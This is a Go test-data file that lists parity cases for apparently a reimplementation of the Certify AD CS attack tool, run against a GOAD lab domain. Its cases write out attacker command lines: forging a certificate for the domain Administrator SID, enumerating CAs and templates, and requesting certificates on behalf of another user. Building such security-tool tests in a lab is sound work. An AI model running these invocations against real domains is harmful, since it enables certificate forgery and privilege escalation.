// Package certifycases exports the canonical ParityCase slice for Certify parity tests.
// Both the test file (certify_parity_test.go) and capture-baseline share this list.
//
// Every case is a real attacker invocation. Goldens are captured from
// the NATIVE Certify.exe (Flangvik/SharpCollection precompiled) running
// against the live SEVENKINGDOMS-CA on dc01.sevenkingdoms.local. Verb
// names follow the dashed convention shipped by SharpCollection
// (enum-cas, manage-ca, request-download, request-renew, request-agent).
package certifycases

import (
	"time"

	"github.com/praetorian-inc/wftest/parity/internal/lab"
	"github.com/praetorian-inc/wftest/parity/labctl"
)

// GOAD sevenkingdoms.local constants.
const (
	goadDomainSID = "S-1-5-21-1004336348-1177238915-682003330"
)

// Cases returns the Certify parity invocations.
func Cases() []labctl.ParityCase {
	const t = 60 * time.Second
	return []labctl.ParityCase{
		// Offline forge — no DC contact required.
		{
			Name: "forge",
			Args: []string{"forge", "/ca:" + lab.CA(), "/subject:CN=Administrator", "/sid:" + goadDomainSID + "-500"},
			Timeout: t,
		},
		// Enumeration verbs as domainadmin.
		{
			Name:    "enum-cas",
			Args:    []string{"enum-cas", "/domain:" + lab.Domain()},
			Persona: "win11-domainadmin",
			Timeout: t,
		},
		{
			Name:    "enum-templates",
			Args:    []string{"enum-templates", "/domain:" + lab.Domain()},
			Persona: "win11-domainadmin",
			Timeout: t,
		},
		{
			Name:    "enum-pkiobjects",
			Args:    []string{"enum-pkiobjects", "/domain:" + lab.Domain()},
			Persona: "win11-domainadmin",
			Timeout: t,
		},
		{
			Name:    "manage-ca",
			Args:    []string{"manage-ca", "/ca:" + lab.CA()},
			Persona: "win11-domainadmin",
			Timeout: t,
		},
		{
			Name:    "manage-template",
			Args:    []string{"manage-template", "/template:User", "/list"},
			Persona: "win11-domainadmin",
			Timeout: t,
		},
		{
			Name:    "manage-self",
			Args:    []string{"manage-self", "/list"},
			Persona: "win11-domainadmin",
			Timeout: t,
		},
		{
			Name:    "request",
			Args:    []string{"request", "/ca:" + lab.CA(), "/template:User"},
			Persona: "win11-domainadmin",
			Timeout: t,
		},
		{
			Name:    "request-download",
			Args:    []string{"request-download", "/ca:" + lab.CA(), "/id:1"},
			Persona: "win11-domainadmin",
			Timeout: t,
		},
		{
			Name:    "request-renew",
			Args:    []string{"request-renew", "/ca:" + lab.CA(), "/template:Machine"},
			Persona: "win11-domainadmin",
			Timeout: t,
		},
		{
			Name:    "request-agent",
			Args:    []string{"request-agent", "/ca:" + lab.CA(), "/template:User", "/onbehalfof:" + lab.Domain() + "\\" + lab.User()},
			Persona: "win11-domainadmin",
			Timeout: t,
		},
	}
}
